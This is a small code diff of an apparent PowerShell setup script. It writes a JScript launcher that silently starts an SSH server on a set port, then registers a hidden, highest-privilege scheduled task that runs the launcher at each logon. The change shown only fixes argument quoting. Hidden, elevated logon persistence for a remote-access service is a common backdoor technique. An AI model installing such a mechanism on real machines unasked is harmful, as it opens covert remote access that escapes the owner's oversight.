@@ -47,7 +47,7 @@ shell.Run(\"\"' + \$sshd + '\" -p ' + \$port, 0, false);
 Set-Content -Path \$jsPath -Value \$jsCode -Encoding ASCII
 
 # Create and register scheduled task
-\$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '\"' + \$jsPath + '\"'
+\$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument \"`\"\$jsPath`\"\"
 \$trigger = New-ScheduledTaskTrigger -AtLogOn
 \$principal = New-ScheduledTaskPrincipal -UserId \$env:USERNAME -RunLevel Highest
 \$settings = New-ScheduledTaskSettingsSet -Hidden
